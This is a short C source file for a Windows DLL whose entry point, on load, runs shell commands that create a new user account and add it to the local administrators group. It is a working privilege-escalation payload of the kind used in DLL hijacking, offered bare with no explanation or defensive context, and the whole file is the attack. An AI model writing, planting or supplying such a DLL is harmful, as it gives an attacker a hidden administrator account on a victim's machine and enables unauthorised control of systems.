#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fwdReason, LPVOID lpvReserved)
{
  switch (fwdReason)
  {
    case DLL_PROCESS_ATTACH:
    escalate();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    break;
  }
  
  return TRUE;

}

int escalate()
{
    system("net user /add USER PASS");
    system("net localgroup administrators USER /add");
    return 0;
}
